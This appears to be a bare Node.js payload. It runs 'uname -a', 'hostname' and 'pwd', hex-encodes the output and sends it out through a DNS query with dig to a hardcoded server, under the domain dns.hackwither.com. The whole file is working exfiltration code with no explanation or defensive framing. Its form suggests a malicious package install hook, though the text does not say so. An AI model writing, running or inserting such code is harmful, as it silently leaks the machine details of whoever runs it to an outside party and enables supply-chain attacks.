const { exec } = require('child_process');

const REMOTE_DNS_LOG_SERVER = 'dns.hackwither.com';
const DNS_SERVER_IP = '18.133.128.31';

exec('uname -a && hostname && pwd', (error, stdout) => {
  if (error) return;
  const hex = Buffer.from(stdout.trim()).toString('hex');
  const width = 63;
  const chunks = hex.match(new RegExp(`.{1,${width}}`, 'g'));
  const label = `${chunks[0]}.chunk0.${REMOTE_DNS_LOG_SERVER}`;
  const command = `dig @${DNS_SERVER_IP} ${label}`;
  exec(command, () => {});
});
